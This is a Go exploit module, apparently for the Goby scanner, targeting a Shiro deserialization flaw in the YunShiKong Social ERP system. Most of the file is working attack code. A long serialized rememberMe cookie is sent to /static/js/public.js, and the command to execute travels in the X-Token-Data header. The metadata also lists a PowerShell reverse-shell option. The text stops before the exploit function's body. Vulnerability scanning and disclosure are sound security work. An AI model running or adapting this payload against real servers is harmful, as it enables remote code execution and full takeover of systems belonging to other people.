package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"

	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "YunShiKong-Social-ERP /static/js/public.js Shiro Code Execution Vulnerability",
    "Description": "<p>The CloudTime Social Business ERP system is an integrated management system designed to help organisations efficiently manage a variety of core business processes, including finance, supply chain, production, and human resources. This vulnerability allows an attacker to execute arbitrary code on the server side, write to the backend, gain server privileges, and then take control of the entire web server.</p>",
    "Product": "YunShiKong-Social-ERP",
    "Homepage": "http://www.ysk360.cn/",
    "DisclosureDate": "2024-06-12",
    "PostTime": "2024-06-12",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"云时空社会化商业ERP系统\"",
    "GobyQuery": "title=\"云时空社会化商业ERP系统\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershell",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/static/js/public.js",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Cookie": "rememberMe=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",
                    "X-Token-Data": "echo sdfkljwer2i342343",
                    "Accept-Encoding": "gzip",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sdfkljwer2i342343",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "云时空社会化商业ERP系统 /static/js/public.js Shiro 代码执行漏洞",
            "Product": "云时空社会化商业ERP系统",
            "Description": "<p>云时空社会化商业ERP系统是一种集成管理系统，旨在帮助企业有效地管理各种核心业务流程，包括财务、供应链、生产、人力资源等方面。攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "YunShiKong-Social-ERP /static/js/public.js Shiro Code Execution Vulnerability",
            "Product": "YunShiKong-Social-ERP",
            "Description": "<p>The CloudTime Social Business ERP system is an integrated management system designed to help organisations efficiently manage a variety of core business processes, including finance, supply chain, production, and human resources. This vulnerability allows an attacker to execute arbitrary code on the server side, write to the backend, gain server privileges, and then take control of the entire web server.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	setPayloadRequestHash1718183102 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		//漏洞url地址
		url := "/static/js/public.js"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
			"Cookie":          "rememberMe=ZkQwQ0NGMEY4ZDhhZjRkQk1PeiBePyZcAaJE7Om+C0hA3jDtN5dVqFAyh+gGxrjM3fdJJFsrOhEOImJ3fCkQTtim1uKYvYhbi2OI/9Kg1Pw8TBrKecFPuI9P8+bEBA2Gin4ksL6+CVrasvh4M+tdwhYyRKyOzqjnszwltyit+VmMzH+gY6SGBYXRDH9NQ7EoRBiSh4uSkPVkj9iIG8eebwjjwoXtR+YapiLcdLhNL/j1/tEVA/yIi84iEWeJQw68POhPeVrTfjBWd48cv1tKokevJeyD8kyh2vkE1leum9mUtoBkiQcnUf30UETOwbXYQv7rejfrVqAYO8A2aSdMRH5DGQzcB4ZFe7e79dYNxxol5pjy46kxohfrGPUGrpUNMEiOOY7GCBBjQF+rVCjrTBvvm8QWHoxLFhmcg4i2ZCshDLtKp24/b+OWtHAfHX+6jYnPKQ49BwwvkUChbTAp/1IS3EYhvaneW6sLxYgLW2DkWOVyHfGyCHl1k3MIZi1Vl6sG/JsWLbLyh+sh8H+73ndNd+SeGs53lO7/dd/5V4AkUeLAS4Y817SYrhGxFW7U/EyV/+1p4/Ya8FHhQYlcc/pFe9Somlmss1ax63WRswo8R+3I24L3mp+5o7xv17m+PEQTm9Pb+/81GFoAgVYcGNXDjtd7dD76uVn9YVEL6UE936jVbsFo/FJb/QqL1rxlPnBD9HHm15UYigKtXIk+/n0wW8rwIImyF5JofTfFcArD8Ibxx1qI+rDMB37F2CeL2+tuMRuYxugUSZ5px79W2QUlhKD/+9F4QiJ2MsmWJ99LQghPqqhdoypK50DaX1ITi64Y6c2I40pd16/DdAr1sFiQXw6paoqeRfqxzydxebnfEz02hhmscGIc5QwMzqi6VzoCW5XJvIB6azK0LQVjatSZvCBCmQU9n8kqjz6YfODvwUImVgtOHWIts0VXuETNI8IYGOmuirPQwNfWDhfKw2Ddy5QTqL+akSU2EHd/Jjn4blVocPsbU86/XNbdRBPPbCq0aDXJCli1BAhu2GSLcev0t9Qn9UyWqzEAxCkQbFD5fnKM55XOSowh9oO8STndvOzxbm82EoHnUKTUbWWZnFxip4QBzLZh7Fyh9z9y+UoB1AgCzzA876xtQW7RgL/Q2h+lGtpXCEwZq7lGkrKScetgLS+yMBTE/FplOgdfl7bp0zWXCMyFj6scO5jGIhxJjRM1mIelOpYGyWsf5VQ2tipD9y9g7nIKgpMgccYRFOPlDHFcQ9muJhp8vO6S+VQBTiWwQQELNEDku+urTHa9zX2uvaINqWMfm5eRJvoJQjy8UYJib1Sgrxf5Xf1LfFPZVnaY1tqRiSaLG83RWUeBsFabNtQh7obsZ27H2EsUh/reF2s9XBy003gZUZ0lI2QtV2HZE7v01WgXhlS1li5ZxH6mOpyljB3TTDaM8Z0BaIlgI43dY+RxswMkfwKwMW8gQOGl6q4AHsboX2Awv8Vxs7kWWVBA+k4qdaPhRy83ZhLIIlx/dvCP/Y6y8McRe7dYnXmHlhNetsEi8lDX/fODPGVUYh53zoOxZp8lqIsU+xe3qrM7p6GfaWSVM3MOhbwIGYvZEhDW5F1ewilRPFgQbLUkfJH9Eiz/VG9j4Dw2xz6bCIqKd/iGglNd9C9QQ24BujKY+TBO5AcT3F23Ytq27tYyun193Sf0cwO1+zgeOwjQWJksxDP6o65bzWL/P0ZafoXp1SU/jFsNoSyVjSFZGbYU00Qy7xz0/piX842kL8KvQI44Oj6aJ30JVVbKbvBu14axyzvUISMHB1qhzpQvOWs0K+W3dlkY7sR0tffRN/gKWRCqilsxjcrRVmx5RiBtuT8cBn8z1SLnqz8SP5ujsmGGtiFUaao5vez98yfeI/GT14c8p3Eo/rVesyUvX+kW4ozBPZi4eZQlmHrzC/lAdGpHemJ9KecHz+OHiRDmOPZd6iw2mSqfNxmAsrGmzdhB3p6bku5kVQ82Uq8UEATTCz9xknItZ3qkS58TvrcXHEpuZLc3BxNgeD6DsCikhfPzecZWB+UyBbBEfjjQkVu1fbVPFXXRF/CC0dyklmZcht9YZZqfZuBdPfY+vEgIriuKJvGy6dgVyFa5d6SJTfRzr4h7CQqXXwPI7bKEdQC0+Bvnl7hBxb8xfHO9j3p1QN0Ge/nrcJZ0ag801myeAwHfOuJAJLPEiQp7fkpOt1FZQPL4QIOThuDlM97pbbnXILitCk0mOiz+3I7ceJRbOP8MwQaF6OOd9hDSuZ43gEfTKSbF9NRgK5yvx/BgarxV9SBMeXZpFNSwhPOmLD2fvuLKX2UdUu5zMBkRr41PQkLRH1PqL2jnRHsHXlnfjC3K70JlNXq3Kkieq15+8qQXGPvdCsOtYnljrnMuroxk8amCvFcuDNEFpWDfl2xRNzhyoNjrUyenDowrYs8KURW0HNbcxpB7MqUsTf4uSkaGvRov4DA7qo0rvFPTls9pcGLloKmyq1O07RbbQ9IsIgEFPsR3Jbm4eAoeHwf4uuTBocAj5DOCnUnpiBOGJUT9eSBJnQsQMqnFhEu63w9yQBD4tNDsqlR9PNd+ayWaWAfbD1xZDLnhNQmW6Z0lZQYZujK5m2gD7vs8AwNa+d7zKrU7gdWhym6J5ZHMdYxBR+QtptiTJy8qaCnQjR4+kqXsGDfq0YmZRXnu9UgDQ48qX1deXPT1iqGBCBa75T+3u41GLVDMkFruz+aTlwoC1UoN+zg12KitJVNTpGeWbVivZb3N3uyJTuMlpgHb2XJKX3/4bXeqVjGxe/8u0hcSddlf9kBEeaDzk3sCTG32R+0YqFCGDCKKzRUTKB8eraEEyTdCS7ld0Tc3bJTPBWlwLiS+f5HNDZIjBKLE37MiEtAWygwxltsMWAFvjcxsoyGwkuu65moX176rYV1CLrDeVnU2SdyHoUmhuOjGF8efFlj8SzCeShvcxGHgRquPJCRTLY60Xg/8+AW3h0Jl19QqjfOYxdVhbN5r73JfdHgUBNpPDrQiAQxSrNHb0NRO/tCkW4PtP/JGPua3R/N7EkyClH5w//+46MfvUfQTIsUTB4Yu4KZKiVa8Sopl6iwW7Wd3OwXsQoFKSmssR3vkpmQQ1NWrNu7w1utmRuL+rPAglaNwDyTBgfY2DTCapd3rq8PPNtnsfZfYnI+p6mUew6HS79YIcAVYvROCJprJ95/Q+phMOhGUPHeVt965EqyJYCHmQwy6PIhO5H7alR/y+6d6U82qJVOQvlLHIOTkKpQR7DwRwq18uPOJzz5jBzBv23YJb/wXoYuNPYLzLydT805jpx0a0x/CpTO3vcylqMjAbddY5Mzt2oDesBnxlu4wuQ1I1yFMG01OVXkNnIweasoXQLXzgQd9EBGijudy3hpYxWKSy8FDf0/louaRz4VBEquz32lm7gd+m+SOcy5P6iAprYwEakOSbb9l1OTLg7ZW+WZv9HN69WS66zfkMs/FMNh0L1iVbyOM/7Rr5v/+D3wz+TPkv5wJ3Q8jMWzQMtxZSfV0XYcVOt1JRMjx+fA3Fq8FBRHnUmNMGfvBLOM04BiaX7gvuJrLGhOt2dwCYxcYobCwKVeNTvFK6E61+128qHoBSbeDtbhKk59P62rm/TqCnXDpkoss7RL8Dsg9eg5ngNxYlgVSEgGMDSGFusavu0WkvlJyJBuw+VocuzH+eFt6eIbgVsIsJhXgllRqtNPUwDWUTgmg9A9Pk6Soxx5VQI6BPX00+Vwgfr0DXSNU9biKHOvDYiYAu6RACRxJ0i1fM8qW2Ao3q28iYQ6CWdCBRVLh820i28qHADPK5ilAsNs2esJgF/XMjMYhwVx+T3jbwef3XW9S6+yb7+BqSPMb7jjGiqCLEL3iSlJyXd+OTRxtzeea3HWQP1o84LMzO3WVX2ZHA8+zh7ao8yIA28pDlE4kO49KciIJs5RFTiGGWYc694RId4MU54r/gTiOXOhTMpYHoXjzW3X7vSOe31EsiMI8mguCzz8hh18UtpB9B+p+QCRSzUYqLYAu7SvgeZuARWZL3210o9gBIMswG6ndALfCIW9QpiNmAr7WSb86TZSMbbvv9ib/mavzLipDXUYuwCF4HZqk50L6ZdMOYA10ONfyC+ZKXx2xswOBs6o0T1iS1B9cTV5wgwjYex8zVCxHbFPkIaVmPtDgqK8sZ2VibjBSB9hq22V3nxZbld2HzMMGCzlLEhUibnaIhWrd3eTiIfK5qPlUEQKQGfFQRwc8yc0k5JOcqHIymOE3fI0PzZAOm2q4p9nlbDuXC/Ea2n+AU2JvH3FZUlVg6NJ/6+3N6iO3WWCK85Wcz1nnoNCUFpIH4IYmoYqARPTPxsfDX06WEOq55ccs8guIbV8Edmc7vVEGuK0t3CDdCaTrjOFxgpagzpiU+Z5byU8/PI/+52Z+KNU2k7YMz9LBhU4g1mKHr4osQykwQ66aGlrJnRmSkviPrvOHOxxCtNivpWEISg3DuReALXLvo85T/Cxn3JII/dkzssrt0+v3K6nM33WBMxquGmOfrVgZoGTkiPa/uRYUIcWjauvoCIrJLthR4GvrzZSTDNI/PTJ/H25qTlysffzyvALq1CofyYO2NAcChyVhcdnP6dK8ZSf2f0O/R2u6tDw9+wTtkFV4aSrtgLBjZ65+g4bZX+Zd1PqUxCDkk14dhT6is50wrEFXVHVrgwZ6UcnsyawjboRIpbOKkVtmXmJralGUPzmSB/UOxR1zaRyj4pJkXG+GnveeEWhbgB+9+BPDnhUorycWfABq8ookf12zDoDXgDNWEEbeRzXACuERpG8a98prQUUwxXRgtDuErVkqTEPwbpr7DvH6bevDCKT3tRf9HLlOOCi3b479W/mQgx/6bibxCGys/X3jxmyq+YADcZXbEbw4ukEmEBCWgCLbwAHomTlcyRyIiuE/GZ+rRf8huaigG7t3Zm4UcUYm/JAFhIAIyRn2E1hJ3sPmq804U1lSjiIKmnW607INzoyLF8aPho72qM/UiF664E8ajcxmwv8mMWIkRNwfwoPmAg4u4/rzHrqhDWsLa5EZ2VGotgEWrfwxkJcZy8JbwcGjzSH2gf5LKpWJmmPt8t/tOeAC4NQymLq8ZoGdULq6ZChBzA/jpngptC3cPvhGWu+4kTtC7cXyA/kBb3OnquoZsQxcaN84evGmWgj63AekXLTchZF2GXxE5qNmrbbVWYap7NPSTAEe9Lia/8kcJ1JvryIZLCkLmA/yoDpMmXAqiT5jSXMb9QddqDSFgUHTujOYJdjQZ/2CaCIMcIEZPPQhwk/j6mwUjPXUxbv4Ug35LwGlWj7ZFwBWCLfY6Lfi5uN/bGC5VCTpzO2tfHFmRwDiabP0NdN0kn7AwQNPecZHEANvTcsZ5+QoEZe0ZUeyFYS1o8naqMnPagJ+qQfU4g9sRfq9RsZleDyV5mmPaCHyD9FvhAmY0DmRQRxyITkiysslis5tJKqjMUr95hXJseXtAfZ2nx6wvaUY4hLHdPSOCEdiNxxmwzA0bYjOwyk1FtVd+0di7qYOnEUVQBnzNKAum4sxT80lcNlW1+vFiZGnL/sArpDNXdbye+eIqgYJ4Pm0lPV9nLV0G4BRD43rujFmO+R6c17Xl9M3zFY8sutjNDR7Gwkx62Q0XRXw4PkAXdb8scDIpHlMdW7TEAIN8ZqGz/ZLgf6llY63Aao1E7DhoDMCBugyVOzX1Ny8eHngNVU8SCi0OeWFWTVTojqEW/fEkl7fLmw6dRMmZHg9Pkyf+NAHMesIEo9fbHfbM8v8PVxpgs2rqcwdyOJ1qkVmhhmIyhvAhBFlteavDliCOxbuaAiIMDe2MbUMBXwgEblaoMuAu+r+3ktVii/mqybUVaFwB+sCT4q6hZMj3SNzmyXg6uv63bDbNk9rKmnMlkDUbFPJ1pLq1c8rSpimUHd/VdTbD4Ah6SWuMaS08FifuLeRkZIiuDkubP1wyJti1w==",
			"X-Token-Data":    command,
			"Accept-Encoding": "gzip",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := strings.Split(resp.RawBody, "document.writeln")[0]

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash1718183102

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
